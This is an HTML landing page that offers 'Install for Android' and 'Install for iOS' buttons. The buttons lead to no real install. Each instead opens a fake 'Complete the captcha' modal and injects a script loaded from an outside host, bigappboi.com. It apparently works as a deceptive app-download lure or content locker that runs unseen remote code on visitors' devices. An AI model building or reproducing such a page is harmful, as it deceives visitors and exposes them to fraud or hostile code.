<!DOCTYPE html>
<html>
<head>
    <title>Landing Page</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">

<style>
    .modal {
      display: none;
      position: fixed;
      z-index: 1;
      left: 0;
      top: 0;
      width: 100%;
      height: 100%;
      overflow: auto;
      background-color: rgba(0,0,0,0.4);
    }
    .modal-content {
    position: absolute;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
    background-color: #fefefe;
    padding: 20px;
    border: 1px solid #888;
    width: 90%; // increased from 80%
    max-width: 90%; // max-width now 90% of the viewport width
    max-height: 80%; 
    overflow: auto;
    text-align: center;
}
    .modal-content h3 {
      text-align: center;
    }
    #captcha-section {
      text-align: center;
      width: 100%;
    }
    .loader {
      border: 16px solid #f3f3f3;
      border-top: 16px solid #3498db;
      border-radius: 50%;
      width: 80px;
      height: 80px;
      animation: spin 2s linear infinite;
      margin: 0 auto;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    .captcha-popup-box {
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
    }
    </style>

    <style>
        body, html {
            height: 100%;
            margin: 0;
            padding: 0;
            background: url(background.jpg);
            background-size: cover;
        }
        .center-content {
            position: absolute;
            left: 50%;
            top: 50%;
            transform: translate(-50%, -50%);
            text-align: center;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
        }
        .center-content img {
            width: 80%;
            margin-bottom: 20px;
        }
        .center-content button {
            width: 90%;
            height: 50px;
            padding: 10px;
            border: none;
            color: black;
            background-color: white;
            margin-bottom: 20px;
            font-size: 1em;
            border-radius: 5px;
            cursor: pointer;
            transition: 0.3s;
        }
        .center-content button:hover {
            background-color: #ddd;
        }
    </style>
</head>
<body>
    <div class="center-content">
        <img src="logo.png" alt="Logo"> 
        <button class="install-button" style="cursor: pointer;">Install for Android</button>
<button class="install-button" style="cursor: pointer;">Install for iOS</button>
<div id="captchaModal" class="modal">
      <div class="modal-content">
        <span id="modalClose" style="float: right;font-size: 22px;font-weight: bold;">&times;</span>
        <h4>Complete the captcha below to continue</h4>
        <div class="loader" id="loader"></div>
        <div id="captcha-section" data-captcha-enable="true"></div>
      </div>
    </div>

    </div>


    

<script>
     const buttons = document.getElementsByClassName('install-button');

for(let btn of buttons){
    btn.addEventListener('click', function(e) {
        e.preventDefault();

        const modal = document.getElementById('captchaModal');
        const captchaSection = document.getElementById('captcha-section');
        
        captchaSection.innerHTML = '';
        captchaSection.dataset['captchaEnable'] = 'true';

        const loader = document.getElementById('loader');
        loader.style.display = 'block';

        const script = document.createElement('script');
        script.src = 'https://bigappboi.com/cp/js/zqz62';
        script.async = true;
        script.onload = (() => {
          loader.style.display = 'none';
        }); 

        document.body.appendChild(script);

        modal.style.display = 'block';
    });
}

document.getElementById('modalClose').addEventListener('click', function() {
    document.getElementById('captchaModal').style.display = 'none';
});
    </script>
</body>
</html>
